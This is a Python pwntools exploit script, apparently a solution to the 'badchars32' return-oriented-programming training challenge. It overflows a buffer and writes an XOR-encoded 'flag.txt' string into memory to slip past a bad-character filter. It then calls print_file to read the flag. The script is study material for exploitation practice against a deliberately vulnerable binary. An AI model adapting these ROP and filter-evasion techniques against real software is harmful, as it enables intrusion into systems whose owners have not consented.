from pwn import *

exe = context.binary = ELF('./badchars32', checksec=False)

offset = 44
pop_esi_edi_gadget = 0x080485b9
data_section_addr = 0x0804a018
mov_gadget = 0x0804854f
print_file = 0x080483d0

xor_ebpaddr_bl_gadget = 0x08048547
pop_ebp_gadget = 0x080485bb
pop_ebx_gadget = 0x0804839d  #bl is the first 8 bytes of ebx


xor_val = 2
xored_string = xor("flag.txt",xor_val)
# info("XORed string is %s",xored_string)

xor_explot = b''
data_offset = 0;
for c in xored_string:
    xor_explot += pack(pop_ebp_gadget)
    xor_explot += pack(data_section_addr + data_offset)
    xor_explot += pack(pop_ebx_gadget)
    xor_explot += pack(xor_val)
    xor_explot += pack(xor_ebpaddr_bl_gadget)
    data_offset += 1


payload = flat(
    asm('nop') * offset,
    pop_esi_edi_gadget,
    xored_string[:4],
    data_section_addr,
    0x0,
    mov_gadget,

    pop_esi_edi_gadget,
    xored_string[4:],
    data_section_addr + 0x4,
    0x0,
    mov_gadget,

    xor_explot,
    # pop_ebp_gadget,
    # data_section_addr,  #pops data section address into ebp
    # pop_ebx_gadget,
    # xor_val,    #pops xor value into bl
    # xor_ebpaddr_bl_gadget, 

    print_file,
    0x0,
    data_section_addr
)

print(payload)
p = process()
p.clean()
p.sendline(payload)
p.interactive()